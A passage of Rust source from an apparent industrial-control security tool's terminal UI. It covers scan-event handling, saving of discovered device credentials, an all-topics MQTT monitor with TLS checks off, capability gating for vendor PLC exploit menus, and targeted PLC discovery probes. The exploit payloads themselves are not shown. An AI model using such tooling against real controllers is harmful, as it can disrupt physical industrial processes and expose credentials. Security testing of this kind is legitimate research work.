                ScanEvent::DeviceFound(info) => {
                    let fields = serde_json::to_value(&info.fields).unwrap_or_default();
                    let _ = db.upsert_protocol_device(&info.ip, &info.vendor, &fields);
                    let _ = db.log(&info.ip, &format!("discovered vendor={}", info.vendor));
                    self.log(format!("[+] {} \u{2192} {}", info.ip, info.vendor));
                    self.reload(db);
                }
                ScanEvent::Done(msg) => {
                    self.output_lines.push(format!("── done: {msg} ──"));
                    self.log(format!("[*] {msg}"));
                    self.active_jobs = self.active_jobs.saturating_sub(1);
                }
                ScanEvent::Output(line) => {
                    if self.output_lines.len() >= 100_000 {
                        self.output_lines.remove(0);
                    }
                    self.output_lines.push(line);
                }
                ScanEvent::MqttLine(line) => {
                    self.mqtt_attack_lines.push(line);
                }
                ScanEvent::MqttDone(label) => {
                    self.mqtt_attack_label = label;
                    self.mqtt_attack_running = false;
                }
                ScanEvent::CredFound {
                    ip,
                    username,
                    password,
                } => {
                    let fields = serde_json::json!({
                        "discovered_username": username,
                        "discovered_password": password,
                    });
                    let vendor = db
                        .load_devices()
                        .ok()
                        .and_then(|devs| devs.into_iter().find(|d| d.ip == ip))
                        .map_or_else(|| "discovered".to_string(), |d| d.vendor);
                    let _ = db.upsert_device(&ip, &vendor, &fields);
                    if self.output_lines.len() >= 500 {
                        self.output_lines.remove(0);
                    }
                    self.output_lines
                        .push(format!("[+] Credentials saved for {ip}: {username}"));
                }
                ScanEvent::TagLeaves {
                    ip,
                    port,
                    vendor,
                    leaves,
                } => {
                    self.output_from_cache = false;
                    self.output_has_tag_content = true;
                    self.output_line_backup = None;
                    self.scan_timestamp = Some(std::time::Instant::now());
                    self.tag_write_ip.clone_from(&ip);
                    self.tag_write_port = port;
                    self.tag_write_vendor.clone_from(&vendor);
                    self.tag_leaves = leaves;
                    // Persist struct member leaves (dotted paths) for offline Overview expansion.
                    let members: Vec<(&str, bool)> = self
                        .tag_leaves
                        .iter()
                        .filter(|(p, _)| p.contains('.'))
                        .map(|(p, w)| (p.as_str(), *w))
                        .collect();
                    if !members.is_empty() {
                        let _ = db.upsert_members_for_protocol(&ip, &vendor, &members);
                    }
                    self.tag_leaf_line_indices =
                        build_leaf_line_indices(&self.output_lines, &self.tag_leaves);
                    self.output_leaf_cursor = if self.tag_leaf_line_indices.is_empty() {
                        None
                    } else {
                        Some(0)
                    };
                    if let Some(&(first_line, _)) = self.tag_leaf_line_indices.first() {
                        self.scroll_to_output_line(first_line);
                    }
                    // Persist output so it survives device-list navigation.
                    self.current_output_ip.clone_from(&ip);
                    self.per_device_output.insert(
                        ip,
                        DeviceOutput {
                            output_lines: self.output_lines.clone(),
                            output_scroll: self.output_scroll,
                            tag_leaves: self.tag_leaves.clone(),
                            tag_leaf_line_indices: self.tag_leaf_line_indices.clone(),
                            output_leaf_cursor: self.output_leaf_cursor,
                            output_line_backup: None,
                            tag_write_ip: self.tag_write_ip.clone(),
                            tag_write_port: self.tag_write_port,
                            tag_write_vendor: self.tag_write_vendor.clone(),
                            scan_timestamp: self.scan_timestamp,
                        },
                    );
                }
            }
        }
    }

    /// Swap output buffers when the selected device changes so each device's
    /// previous scan results are instantly visible without re-running exploits.
    fn sync_device_output(&mut self) {
        let selected_ip = self
            .selected_device()
            .map(|d| d.ip.clone())
            .unwrap_or_default();
        if selected_ip == self.current_output_ip {
            return;
        }
        // Save current output to the old device's slot.
        let old_ip = std::mem::take(&mut self.current_output_ip);
        if !old_ip.is_empty() {
            self.per_device_output.insert(
                old_ip,
                DeviceOutput {
                    output_lines: std::mem::take(&mut self.output_lines),
                    output_scroll: std::mem::replace(&mut self.output_scroll, 0),
                    tag_leaves: std::mem::take(&mut self.tag_leaves),
                    tag_leaf_line_indices: std::mem::take(&mut self.tag_leaf_line_indices),
                    output_leaf_cursor: self.output_leaf_cursor.take(),
                    output_line_backup: self.output_line_backup.take(),
                    tag_write_ip: std::mem::take(&mut self.tag_write_ip),
                    tag_write_port: std::mem::replace(&mut self.tag_write_port, 0),
                    tag_write_vendor: std::mem::take(&mut self.tag_write_vendor),
                    scan_timestamp: std::mem::take(&mut self.scan_timestamp),
                },
            );
        }
        self.current_output_ip.clone_from(&selected_ip);
        // Restore the new device's output if we have a snapshot.
        if let Some(cached) = self.per_device_output.remove(&selected_ip) {
            self.output_lines = cached.output_lines;
            self.output_scroll = cached.output_scroll;
            self.tag_leaves = cached.tag_leaves;
            self.tag_leaf_line_indices = cached.tag_leaf_line_indices;
            self.output_leaf_cursor = cached.output_leaf_cursor;
            self.output_line_backup = cached.output_line_backup;
            self.tag_write_ip = cached.tag_write_ip;
            self.tag_write_port = cached.tag_write_port;
            self.tag_write_vendor = cached.tag_write_vendor;
            self.scan_timestamp = cached.scan_timestamp;
            self.output_from_cache = !self.tag_leaves.is_empty();
        } else {
            self.output_from_cache = false;
            // No cached output — auto-load DB overview so the panel isn't blank.
            maybe_auto_load_tags(self);
        }
    }

    fn drain_mqtt_messages(&mut self) {
        let messages = match &self.mqtt_session {
            Some(arc) => match arc.try_lock() {
                Ok(s) => s.drain_messages(),
                Err(_) => return,
            },
            None => return,
        };
        for msg in messages {
            self.mqtt_total_msgs += 1;
            let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
            let label = format!("{display}  [{fmt}]");
            if let Some(entry) = self
                .mqtt_topics
                .iter_mut()
                .find(|(t, _, _)| t == &msg.topic)
            {
                entry.1 += 1;
                entry.2 = label;
            } else {
                self.mqtt_topics.push((msg.topic.clone(), 1, label));
                self.mqtt_topics.sort_by(|a, b| a.0.cmp(&b.0));
            }
            if msg.retain {
                self.mqtt_retained.insert(msg.topic.clone());
            }
        }
    }

    fn enter_mqtt_monitor(&mut self, ip: &str, port: u16) {
        self.mqtt_session = None;
        self.mqtt_topics.clear();
        self.mqtt_retained.clear();
        self.mqtt_total_msgs = 0;
        self.mqtt_topic_list_state = ListState::default();
        self.mqtt_filter.clear();
        self.mqtt_attack_lines.clear();
        self.mqtt_attack_scroll = 0;
        self.mqtt_attack_label.clear();

        let opts = ConnectOptions {
            host: ip.to_string(),
            port,
            client_id: "scadaver-tui".into(),
            keepalive: 60,
            clean_session: true,
            username: if self.mqtt_username.is_empty() {
                None
            } else {
                Some(self.mqtt_username.clone())
            },
            password: if self.mqtt_password.is_empty() {
                None
            } else {
                Some(self.mqtt_password.clone())
            },
            will: None,
            tls: self.mqtt_conn.tls || port == 8883,
            tls_verify: false,
            protocol_version: self.mqtt_conn.version,
        };
        match MqttSession::connect(&opts) {
            Ok(mut session) => {
                let _ = session.subscribe("#", 0);
                let _ = session.subscribe("$SYS/#", 0);
                self.mqtt_broker = format!("{ip}:{port}");
                self.mqtt_session = Some(Arc::new(Mutex::new(session)));
                self.mode = Mode::MqttMonitor;
                self.log(format!("[*] MQTT monitor \u{2192} {ip}:{port}"));
            }
            Err(e) => {
                self.output_lines
                    .push(format!("MQTT connect failed: {e:#}"));
                self.log(format!("[!] MQTT connect failed: {e:#}"));
            }
        }
    }

    fn open_exploit_menu(&mut self) {
        if let Some(vendor) = self.selected_device().map(|d| d.vendor.clone()) {
            self.vendor_override = None;
            self.exploit_defs = exploits_for(&vendor);
            self.exploit_sel = 0;
            self.exploit_list_state = ListState::default();
            self.exploit_list_state.select(Some(0));
            if vendor == "multi" {
                self.vendor_pick_sel = 0;
                self.mode = Mode::VendorPicker;
            } else {
                self.mode = Mode::ExploitMenu;
            }
        }
    }

    fn scroll_output_up(&mut self, n: usize) {
        self.output_scroll = self
            .output_scroll
            .saturating_add(n)
            .min(self.output_lines.len().saturating_sub(1));
    }

    fn scroll_output_down(&mut self, n: usize) {
        self.output_scroll = self.output_scroll.saturating_sub(n);
    }

    fn enter_zoom(&mut self) {
        self.zoom_from = self.mode.clone();
        self.mode = Mode::OutputZoom;
    }

    fn exit_zoom(&mut self) {
        self.mode = self.zoom_from.clone();
    }

    fn scroll_to_output_line(&mut self, line_idx: usize) {
        let total = self.output_lines.len();
        let end = (line_idx + 1).min(total);
        self.output_scroll = total.saturating_sub(end);
    }

    fn leaf_cursor_next(&mut self) {
        if let Some(n) = self.output_leaf_cursor {
            let max = self.tag_leaf_line_indices.len().saturating_sub(1);
            let new_n = (n + 1).min(max);
            self.output_leaf_cursor = Some(new_n);
            if let Some(&(li, _)) = self.tag_leaf_line_indices.get(new_n) {
                self.scroll_to_output_line(li);
            }
        }
    }

    fn leaf_cursor_prev(&mut self) {
        if let Some(n) = self.output_leaf_cursor {
            let new_n = n.saturating_sub(1);
            self.output_leaf_cursor = Some(new_n);
            if let Some(&(li, _)) = self.tag_leaf_line_indices.get(new_n) {
                self.scroll_to_output_line(li);
            }
        }
    }

    #[cfg(test)]
    pub fn draw(&mut self, frame: &mut ratatui::Frame) {
        draw(frame, self);
    }
}

// ─── Scan workers ────────────────────────────────────────────────────────────

fn action_availability(app: &App, exploit: &ExploitDef) -> ActionAvailability {
    if exploit.label.starts_with('\u{2190}') {
        return ActionAvailability {
            enabled: true,
            reason: None,
        };
    }
    match exploit.requirement {
        ExploitRequirement::None => ActionAvailability {
            enabled: true,
            reason: None,
        },
        ExploitRequirement::Capability(capability) => {
            let Some(dev) = app.selected_device() else {
                return ActionAvailability {
                    enabled: false,
                    reason: Some("no device selected"),
                };
            };
            // For MULTI devices viewed through a vendor_override, resolve the
            // sub-vendor's nested field map so cap_ flags are visible.
            let maybe_sub_dev: Option<DeviceRecord> = if dev.vendor == "multi" {
                app.vendor_override.as_deref().and_then(|v| {
                    dev.fields
                        .get(v)
                        .and_then(Value::as_object)
                        .map(|sub_map| DeviceRecord {
                            id: dev.id,
                            ip: dev.ip.clone(),
                            vendor: v.to_string(),
                            last_seen: dev.last_seen,
                            fields: Value::Object(sub_map.clone()),
                        })
                })
            } else {
                None
            };
            let check_dev = maybe_sub_dev.as_ref().unwrap_or(dev);
            capability_availability(check_dev, capability)
        }
    }
}

fn capability_availability(dev: &DeviceRecord, capability: CapabilityKey) -> ActionAvailability {
    let fields = &dev.fields;
    let vendor = dev.vendor.to_ascii_lowercase();
    let protocol = field_str(fields, "protocol").unwrap_or_default();
    let discovery_transport = field_str(fields, "discovery_transport").unwrap_or_default();

    let has_port = |keys: &[&str]| {
        keys.iter()
            .any(|key| field_port_value(fields, key).is_some())
    };
    let enabled = match capability {
        CapabilityKey::BeckhoffAds => {
            field_bool_value(fields, "cap_ads_tcp").unwrap_or_else(|| {
                protocol == "ads_tcp"
                    || has_port(&["ads_port"])
                    || (vendor == "beckhoff" && has_port(&["port"]))
            })
        }
        CapabilityKey::BeckhoffUdpDiscovery => field_bool_value(fields, "cap_ads_udp_discovery")
            .unwrap_or(vendor == "beckhoff" && discovery_transport == "udp"),
        CapabilityKey::BeckhoffWeb => field_bool_value(fields, "cap_beckhoff_web_candidate")
            .unwrap_or(vendor == "beckhoff" && has_port(&["web_port"])),
        CapabilityKey::S7Tcp => field_bool_value(fields, "cap_s7_tcp").unwrap_or_else(|| {
            has_port(&["s7_port"])
                || (vendor == "siemens" && has_port(&["port"]))
                || fields
                    .get("open_ports")
                    .and_then(Value::as_array)
                    .is_some_and(|ports| ports.iter().any(|p| p.as_u64() == Some(102)))
        }),
        CapabilityKey::SchneiderIdentity => {
            SchneiderCapabilities::from_device(dev).identity_confirmed
        }
        CapabilityKey::SchneiderModbus => {
            SchneiderCapabilities::from_device(dev).modbus_tcp_confirmed
        }
        CapabilityKey::SchneiderWeb => SchneiderCapabilities::from_device(dev).web_candidate(),
        CapabilityKey::Fc90Classic => {
            let caps = SchneiderCapabilities::from_device(dev);
            caps.modbus_tcp_confirmed && caps.fc90_family == SchneiderFamily::ClassicFc90
        }
        CapabilityKey::Fc90Tm221 => {
            let caps = SchneiderCapabilities::from_device(dev);
            caps.modbus_tcp_confirmed && caps.fc90_family == SchneiderFamily::Tm221
        }
        CapabilityKey::PhoenixInfo => {
            field_bool_value(fields, "cap_phoenix_info").unwrap_or_else(|| {
                has_port(&["phoenix_info_port"]) || fields.get("plc_type").is_some()
            })
        }
        CapabilityKey::PhoenixWebVisit => field_bool_value(fields, "cap_webvisit_candidate")
            .unwrap_or_else(|| {
                has_port(&["webvisit_port", "http_port", "web_port"]) || vendor == "phoenix"
            }),
        CapabilityKey::EwonHttp => field_bool_value(fields, "cap_ewon_http_candidate")
            .unwrap_or_else(|| has_port(&["http_port", "web_port"]) || vendor == "ewon"),
        CapabilityKey::EnipTcp => {
            field_bool_value(fields, "cap_enip_tcp_identity").unwrap_or_else(|| {
                has_port(&["enip_port"])
                    || (matches!(vendor.as_str(), "rockwell" | "enip") && has_port(&["port"]))
                    || fields.get("product_name").is_some()
            })
        }
        CapabilityKey::MitsubishiIdentity => field_bool_value(fields, "cap_mitsubishi_identity")
            .unwrap_or_else(|| {
                field_bool(fields, "cap_gxworks_udp")
                    || field_bool(fields, "cap_slmp_tcp")
                    || fields.get("plc_type").is_some()
            }),
        CapabilityKey::MitsubishiControlUdp => field_bool_value(fields, "cap_gxworks_udp")
            .unwrap_or_else(|| {
                vendor == "mitsubishi"
                    && matches!(discovery_transport, "udp" | "both")
                    && has_port(&["discovery_port"])
            }),
        CapabilityKey::SlmpTcp => field_bool_value(fields, "cap_slmp_tcp").unwrap_or_else(|| {
            protocol == "slmp_tcp"
                || has_port(&["slmp_port"])
                || (vendor == "mitsubishi" && has_port(&["port"]))
        }),
        CapabilityKey::FinsTcp => field_bool_value(fields, "cap_fins_tcp").unwrap_or_else(|| {
            has_port(&["fins_port"]) || (vendor == "omron" && has_port(&["port"]))
        }),
        CapabilityKey::Iec104Tcp => {
            field_bool_value(fields, "cap_iec104_tcp").unwrap_or_else(|| {
                has_port(&["iec104_port"]) || (vendor == "iec104" && has_port(&["port"]))
            })
        }
        CapabilityKey::SnmpUdp => field_bool_value(fields, "cap_snmp_udp")
            .unwrap_or_else(|| has_port(&["snmp_port"]) || vendor == "snmp"),
        CapabilityKey::SnmpWrite => {
            // Enabled if we know a write community exists, or the user can supply one
            field_bool_value(fields, "cap_snmp_udp").unwrap_or_else(|| vendor == "snmp")
        }
        CapabilityKey::SnmpApc => field_bool_value(fields, "cap_snmp_apc").unwrap_or(false),
        CapabilityKey::MqttTcp => field_bool_value(fields, "cap_mqtt_tcp")
            .unwrap_or_else(|| has_port(&["mqtt_port"]) || vendor == "mqtt"),
        CapabilityKey::BacnetIp => field_bool_value(fields, "cap_bacnet")
            .unwrap_or_else(|| has_port(&["bacnet_port"]) || vendor == "bacnet"),
        CapabilityKey::Dnp3Tcp => field_bool_value(fields, "cap_dnp3")
            .unwrap_or_else(|| has_port(&["dnp3_port"]) || vendor == "dnp3"),
        CapabilityKey::OpcuaTcp => field_bool_value(fields, "cap_opcua")
            .unwrap_or_else(|| has_port(&["opcua_port"]) || vendor == "opcua"),
    };

    ActionAvailability {
        enabled,
        reason: (!enabled).then_some(capability_missing_reason(capability)),
    }
}

fn capability_missing_reason(capability: CapabilityKey) -> &'static str {
    match capability {
        CapabilityKey::BeckhoffAds => "Beckhoff ADS TCP has not been confirmed",
        CapabilityKey::BeckhoffUdpDiscovery => "Beckhoff UDP discovery has not been confirmed",
        CapabilityKey::BeckhoffWeb => "Beckhoff web interface has not been identified",
        CapabilityKey::S7Tcp => "Siemens S7 TCP has not been confirmed",
        CapabilityKey::SchneiderIdentity => "Schneider identity has not been confirmed",
        CapabilityKey::SchneiderModbus => "Modbus TCP has not been confirmed for this device",
        CapabilityKey::SchneiderWeb => "Schneider web interface has not been identified",
        CapabilityKey::Fc90Classic => "FC90 classic family not identified",
        CapabilityKey::Fc90Tm221 => "TM221 family not identified",
        CapabilityKey::PhoenixInfo => "Phoenix ProConOS info service has not been confirmed",
        CapabilityKey::PhoenixWebVisit => "Phoenix WebVisit interface has not been identified",
        CapabilityKey::EwonHttp => "eWON HTTP interface has not been identified",
        CapabilityKey::EnipTcp => "EtherNet/IP TCP has not been confirmed",
        CapabilityKey::MitsubishiIdentity => "Mitsubishi identity has not been confirmed",
        CapabilityKey::MitsubishiControlUdp => "Mitsubishi UDP control path has not been confirmed",
        CapabilityKey::SlmpTcp => "SLMP TCP has not been confirmed",
        CapabilityKey::FinsTcp => "FINS TCP has not been confirmed",
        CapabilityKey::Iec104Tcp => "IEC 104 TCP has not been confirmed",
        CapabilityKey::SnmpUdp | CapabilityKey::SnmpWrite => "SNMP UDP has not been confirmed",
        CapabilityKey::SnmpApc => "APC UPS not identified via SNMP sysObjectID",
        CapabilityKey::MqttTcp => "MQTT TCP has not been confirmed",
        CapabilityKey::BacnetIp => "BACnet/IP has not been confirmed",
        CapabilityKey::Dnp3Tcp => "DNP3 TCP has not been confirmed",
        CapabilityKey::OpcuaTcp => "OPC-UA TCP has not been confirmed",
    }
}

fn unavailable_suffix(reason: Option<&str>) -> String {
    match reason {
        Some(reason) if reason.contains("Modbus") => " [no Modbus]".to_string(),
        Some(reason) if reason.contains("ADS") => " [no ADS]".to_string(),
        Some(reason) if reason.contains("SLMP") => " [no SLMP]".to_string(),
        Some(reason) if reason.contains("S7") => " [no S7]".to_string(),
        Some(reason) if reason.contains("FINS") => " [no FINS]".to_string(),
        Some(reason) if reason.contains("IEC 104") => " [no IEC104]".to_string(),
        Some(reason) if reason.contains("EtherNet/IP") => " [no ENIP]".to_string(),
        Some(reason) if reason.contains("UDP control") => " [no control]".to_string(),
        Some(reason) if reason.contains("web") => " [no web]".to_string(),
        Some(reason) if reason.contains("HTTP") => " [no http]".to_string(),
        Some(reason) if reason.contains("FC90") || reason.contains("TM221") => {
            " [model unknown]".to_string()
        }
        Some(_) => " [unavailable]".to_string(),
        None => String::new(),
    }
}

fn requires_confirmation(exploit: &ExploitDef) -> bool {
    matches!(
        exploit.risk,
        ExploitRisk::SensitiveRead | ExploitRisk::LongRunning | ExploitRisk::WriteControl
    )
}

fn parse_target_scan(raw: &str) -> Option<TargetScan> {
    let mut parts = raw.split_whitespace();
    let addr = parts.next()?;
    let mut transport = None;
    let mut vendor = None;
    for token in parts {
        if let Some(t) = parse_target_transport(token) {
            if transport.replace(t).is_some() {
                return None;
            }
        } else if is_target_vendor(token) {
            if vendor.replace(token.to_ascii_lowercase()).is_some() {
                return None;
            }
        } else {
            return None;
        }
    }

    let (ip, port) = if let Some((addr_ip, port_s)) = addr.rsplit_once(':') {
        let port = port_s.parse::<u16>().ok()?;
        if port == 0 {
            return None;
        }
        (addr_ip.to_string(), Some(port))
    } else {
        (addr.to_string(), None)
    };

    ip.parse::<std::net::Ipv4Addr>().ok()?;
    Some(TargetScan {
        ip,
        port,
        transport,
        vendor,
    })
}

fn parse_target_transport(token: &str) -> Option<TargetTransport> {
    match token.to_ascii_lowercase().as_str() {
        "udp" => Some(TargetTransport::Udp),
        "tcp" => Some(TargetTransport::Tcp),
        "both" => Some(TargetTransport::Both),
        _ => None,
    }
}

fn target_transport_label(transport: TargetTransport) -> &'static str {
    match transport {
        TargetTransport::Udp => "udp",
        TargetTransport::Tcp => "tcp",
        TargetTransport::Both => "both",
    }
}

fn is_target_vendor(token: &str) -> bool {
    let token = token.to_ascii_lowercase();
    ALL_VENDORS.iter().any(|&vendor| vendor == token)
}

fn field_str<'a>(fields: &'a Value, key: &str) -> Option<&'a str> {
    fields.get(key)?.as_str()
}

fn field_bool(fields: &Value, key: &str) -> bool {
    fields.get(key).and_then(Value::as_bool).unwrap_or(false)
}

fn field_bool_value(fields: &Value, key: &str) -> Option<bool> {
    fields.get(key).and_then(Value::as_bool)
}

fn field_port_value(fields: &Value, key: &str) -> Option<u16> {
    fields
        .get(key)?
        .as_u64()
        .and_then(|n| u16::try_from(n).ok())
}

fn is_schneider_identity_name(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    !name.contains("compatible")
        && (name.contains("schneider")
            || name.contains("modicon")
            || name.contains("telemecanique")
            || name.contains("m340")
            || name.contains("m580")
            || name.contains("quantum")
            || name.contains("premium")
            || name.contains("tm221")
            || name.contains("tm241")
            || name.contains("tm251"))
}

fn selected_transport(app: &App) -> Option<TargetTransport> {
    app.selected_device()
        .and_then(|d| d.fields.get("discovery_transport"))
        .and_then(|v| v.as_str())
        .and_then(parse_target_transport)
}

fn schneider_transport(transport: TargetTransport) -> casket::vendors::schneider::scan::Transport {
    use casket::vendors::schneider::scan::Transport;
    match transport {
        TargetTransport::Udp => Transport::Udp,
        TargetTransport::Tcp => Transport::Tcp,
        TargetTransport::Both => Transport::Both,
    }
}

fn mitsubishi_transport(
    transport: TargetTransport,
) -> casket::vendors::mitsubishi::scan::Transport {
    use casket::vendors::mitsubishi::scan::Transport;
    match transport {
        TargetTransport::Udp => Transport::Udp,
        TargetTransport::Tcp => Transport::Tcp,
        TargetTransport::Both => Transport::Both,
    }
}

fn schneider_device_info(d: casket::vendors::schneider::scan::SchneiderDevice) -> DeviceInfo {
    let ip = d.ip.clone();
    let mut fields = HashMap::new();
    let name_for_family = d.name.clone().unwrap_or_default();
    let identity_confirmed = d.identity_match
        || (matches!(d.discovery_transport.as_deref(), Some("udp"))
            && (d.name.is_some() || d.firmware.is_some()));
    let modbus_tcp_confirmed = d.protocol.as_deref() == Some("modbus_tcp") || d.port.is_some();
    let udp_confirmed =
        matches!(d.discovery_transport.as_deref(), Some("udp")) && identity_confirmed;
    let fc90_family = SchneiderFamily::from_name(&name_for_family);

    if let Some(name) = d.name {
        fields.insert("name".into(), Value::String(name));
    }
    if let Some(fw) = d.firmware {
        fields.insert("firmware".into(), Value::String(fw));
    }
    if let Some(protocol) = d.protocol {
        fields.insert("protocol".into(), Value::String(protocol));
    }
    if let Some(port) = d.port {
        fields.insert("port".into(), Value::Number(i64::from(port).into()));
        fields.insert("modbus_port".into(), Value::Number(i64::from(port).into()));
    } else {
        fields.insert(
            "port".into(),
            Value::Number(i64::from(casket::core::modbus::DEFAULT_PORT).into()),
        );
        fields.insert(
            "modbus_port".into(),
            Value::Number(i64::from(casket::core::modbus::DEFAULT_PORT).into()),
        );
    }
    if let Some(transport) = d.discovery_transport {
        fields.insert("discovery_transport".into(), Value::String(transport));
    }
    if let Some(unit_id) = d.modbus_unit_id {
        fields.insert(
            "modbus_unit_id".into(),
            Value::Number(i64::from(unit_id).into()),
        );
    }
    if identity_confirmed {
        fields.insert("web_port".into(), Value::Number(80i64.into()));
    }
    fields.insert(
        "cap_identity_confirmed".into(),
        Value::Bool(identity_confirmed),
    );
    fields.insert("cap_schneider_udp".into(), Value::Bool(udp_confirmed));
    fields.insert("cap_modbus_tcp".into(), Value::Bool(modbus_tcp_confirmed));
    fields.insert(
        "fc90_family".into(),
        Value::String(fc90_family.as_field().to_string()),
    );
    DeviceInfo {
        vendor: "schneider".into(),
        ip,
        fields,
    }
}

fn mitsubishi_device_info(d: casket::vendors::mitsubishi::scan::MitsubishiDevice) -> DeviceInfo {
    let ip = d.ip.clone();
    let mut fields = HashMap::new();
    let protocol = d.protocol.clone().unwrap_or_default();
    let discovery_transport = d.discovery_transport.clone().unwrap_or_default();
    fields.insert("plc_type".into(), Value::String(d.plc_type));
    if let Some(title) = d.title {
        fields.insert("title".into(), Value::String(title));
    }
    if let Some(comment) = d.comment {
        fields.insert("comment".into(), Value::String(comment));
    }
    if let Some(protocol) = d.protocol {
        fields.insert("protocol".into(), Value::String(protocol));
    }
    if let Some(port) = d.port {
        if matches!(d.discovery_transport.as_deref(), Some("tcp")) {
            fields.insert("port".into(), Value::Number(i64::from(port).into()));
            fields.insert("slmp_port".into(), Value::Number(i64::from(port).into()));
        } else {
            fields.insert(
                "port".into(),
                Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
            );
            fields.insert(
                "discovery_port".into(),
                Value::Number(i64::from(port).into()),
            );
            fields.insert(
                "slmp_port".into(),
                Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
            );
        }
    } else {
        fields.insert(
            "port".into(),
            Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
        );
        fields.insert(
            "slmp_port".into(),
            Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
        );
    }
    if let Some(transport) = d.discovery_transport {
        fields.insert("discovery_transport".into(), Value::String(transport));
    }
    fields.insert("cap_mitsubishi_identity".into(), Value::Bool(true));
    fields.insert(
        "cap_gxworks_udp".into(),
        Value::Bool(protocol == "gxworks_udp" || discovery_transport == "udp"),
    );
    fields.insert(
        "cap_slmp_tcp".into(),
        Value::Bool(protocol == "slmp_tcp" || discovery_transport == "tcp"),
    );
    fields.insert("cap_slmp_udp".into(), Value::Bool(protocol == "slmp_udp"));
    DeviceInfo {
        vendor: "mitsubishi".into(),
        ip,
        fields,
    }
}

fn beckhoff_device_info(
    d: casket::vendors::beckhoff::scan::BeckhoffDevice,
    port: Option<u16>,
) -> DeviceInfo {
    let ip = d.ip.clone();
    let ads_tcp_fallback = d.name.starts_with("Beckhoff ADS TCP");
    let mut fields = HashMap::new();
    fields.insert("name".into(), Value::String(d.name));
    fields.insert("netid".into(), Value::String(d.netid_str));
    fields.insert("tc_version".into(), Value::String(d.tc_version));
    fields.insert("kernel".into(), Value::String(d.kernel));
    fields.insert("protocol".into(), Value::String("ads_tcp".into()));
    if ads_tcp_fallback {
        fields.insert("discovery_transport".into(), Value::String("tcp".into()));
    } else {
        fields.insert("discovery_port".into(), Value::Number(48899i64.into()));
        fields.insert("discovery_transport".into(), Value::String("udp".into()));
    }
    fields.insert(
        "port".into(),
        Value::Number(
            i64::from(port.unwrap_or(casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
        ),
    );
    fields.insert(
        "ads_port".into(),
        Value::Number(
            i64::from(port.unwrap_or(casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
        ),
    );
    fields.insert(
        "web_port".into(),
        Value::Number(i64::from(casket::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into()),
    );
    fields.insert("cap_ads_tcp".into(), Value::Bool(true));
    fields.insert(
        "cap_ads_udp_discovery".into(),
        Value::Bool(!ads_tcp_fallback),
    );
    fields.insert("cap_beckhoff_web_candidate".into(), Value::Bool(true));
    DeviceInfo {
        vendor: "beckhoff".into(),
        ip,
        fields,
    }
}

fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
    std::thread::spawn(move || {
        let label = target.label();
        let _ = tx.send(ScanEvent::Output(format!("[*] Probing {label}...")));

        if matches!(target.vendor.as_deref(), Some("mitsubishi")) {
            use casket::vendors::mitsubishi::{scan, slmp};

            let port = target.port.unwrap_or(slmp::DEFAULT_PORT);
            let transport = target.transport.unwrap_or(TargetTransport::Both);
            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Mitsubishi targeted scan ({}, SLMP TCP port {port})...",
                target_transport_label(transport)
            )));
            if let Ok(devs) = scan::scan_ip_with_transport(
                &target.ip,
                3,
                true,
                port,
                mitsubishi_transport(transport),
            ) {
                if let Some(dev) = devs.into_iter().next() {
                    let plc_type = dev.plc_type.clone();
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[+] Mitsubishi: {} ({plc_type})",
                        target.ip
                    )));
                    let _ = tx.send(ScanEvent::DeviceFound(mitsubishi_device_info(dev)));
                    let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                    return;
                }
            }
            let _ = tx.send(ScanEvent::Output(format!(
                "[-] {label} - no Mitsubishi response"
            )));
            let _ = tx.send(ScanEvent::Done(format!(
                "Scan of {label} complete (no result)"
            )));
            return;
        }

        if matches!(target.vendor.as_deref(), Some("beckhoff")) {
            use casket::vendors::beckhoff::scan;

            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Beckhoff targeted discovery (ADS TCP port {})...",
                target.port.unwrap_or(scan::DEFAULT_ADS_PORT)
            )));
            if let Ok(devs) =
                scan::discover_ip_with_port(&target.ip, 3, true, target.port.unwrap_or(0))
            {
                if let Some(dev) = devs.into_iter().next() {
                    let name = dev.name.clone();
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[+] Beckhoff: {} ({name})",
                        target.ip
                    )));
                    let _ = tx.send(ScanEvent::DeviceFound(beckhoff_device_info(
                        dev,
                        target.port,
                    )));
                    let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                    return;
                }
            }
            let mut fields = HashMap::new();
            let ads_port = target.port.unwrap_or(scan::DEFAULT_ADS_PORT);
            fields.insert("port".into(), Value::Number(i64::from(ads_port).into()));
            fields.insert("ads_port".into(), Value::Number(i64::from(ads_port).into()));
            fields.insert(
                "web_port".into(),
                Value::Number(
                    i64::from(casket::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into(),
                ),
            );
            fields.insert("protocol".into(), Value::String("ads_tcp".into()));
            fields.insert("discovery_transport".into(), Value::String("tcp".into()));
            fields.insert("cap_ads_tcp".into(), Value::Bool(false));
            fields.insert("cap_ads_udp_discovery".into(), Value::Bool(false));
            fields.insert("cap_beckhoff_web_candidate".into(), Value::Bool(true));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                vendor: "beckhoff".into(),
                ip: target.ip.clone(),
                fields,
            }));
            let _ = tx.send(ScanEvent::Output(format!(
                "[!] {label} - no Beckhoff discovery response; stored with ADS port"
            )));
            let _ = tx.send(ScanEvent::Done(format!(
                "Scan of {label} complete (no result)"
            )));
            return;
        }

        if matches!(target.vendor.as_deref(), Some("modbus")) {
            use casket::core::modbus;
            let port = target.port.unwrap_or(modbus::DEFAULT_PORT);
            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Modbus TCP probe (port {port})..."
            )));
            let responded = modbus::read_holding_registers(&target.ip, port, 0, 1).is_ok();
            let mut fields = HashMap::new();
            fields.insert("port".into(), Value::Number(i64::from(port).into()));
            fields.insert("modbus_port".into(), Value::Number(i64::from(port).into()));
